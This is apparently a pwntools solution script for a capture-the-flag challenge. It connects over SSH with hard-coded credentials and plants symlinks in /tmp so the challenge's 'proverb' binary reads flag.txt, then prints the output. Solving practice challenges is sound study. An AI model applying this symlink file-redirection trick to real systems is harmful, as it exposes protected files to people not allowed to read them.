#!/usr/bin/python
# -*- Coding: utf-8 -*-

from pwn import *

s = ssh (host="ctfq.sweetduet.info", port=10022, user="q13", password="8zvWx00MakSCQuGq")

context.log_level = "debug"

s.process(['mkdir', '/tmp/okupay'])
s.process(['ln', '-s', '~/proverb', '/tmp/okupay/proverb'])
s.process(['ln', '-s', '~/flag.txt', '/tmp/okupay/proverb.txt'])
s.set_working_directory(wd="/tmp/okupay")
target = s.process(['./proverb'])

print(target.readline())

